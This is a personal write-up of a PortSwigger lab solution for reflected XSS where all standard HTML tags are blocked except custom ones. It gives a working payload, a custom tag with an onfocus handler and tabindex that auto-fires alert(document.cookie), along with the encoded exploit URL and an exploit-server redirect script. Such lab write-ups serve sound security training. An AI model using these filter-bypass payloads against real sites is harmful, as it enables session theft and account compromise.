---
title: LAB 0.12
aliases:
  - LAB 0.12
tags:
  - XSS
  - Labs
  - Reflected
  - Practitioner
description: "Lab: Reflected XSS into HTML context with all tags blocked except custom ones"
---
# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

# Solution
---
## 1. **Initial Test with a Custom Tag**

Access the lab and enter `<hello>` in the search bar. The response confirms the tag is reflected in the DOM:

![[images/Pasted image 20250125215534.png]]

![[images/Pasted image 20250125215617.png]]
## 2. **Create the Payload**

Inject the following payload in the search bar:

```html
<hello onfocus="alert(document.cookie)" id="x" tabindex="1">
```

Explanation:

- **`onfocus`**: Executes JavaScript when the element gains focus.
- **`alert(document.cookie)`**: Displays the document's cookies.
- **`id="x"` and `tabindex="1"`**: Allows auto-focus using the `#` fragment.

Inspect the DOM to confirm the injection:

![[images/Pasted image 20250125215827.png]]

## 3. **Craft the Exploit URL**

Append `#x` to your lab URL to activate the focus on load:

```html
https://0ae200f90426d234827e203500c60050.web-security-academy.net/?search=<hello+onfocus%3D"alert(document.cookie)"+id%3D"x"+tabindex%3D"1">#x
```

## 4. **Deliver the Exploit**

1. Click **"Go to exploit server"**.
2. Add this script to the body:
    
    ```html
    <script>
    location = 'https://0ae200f90426d234827e203500c60050.web-security-academy.net/?search=<hello+onfocus%3D"alert(document.cookie)"+id%3D"x"+tabindex%3D"1">#x';
    </script>
    ```
    
3. Click **"Deliver exploit to victim"**.

![[images/Pasted image 20250125220313.png]]
---
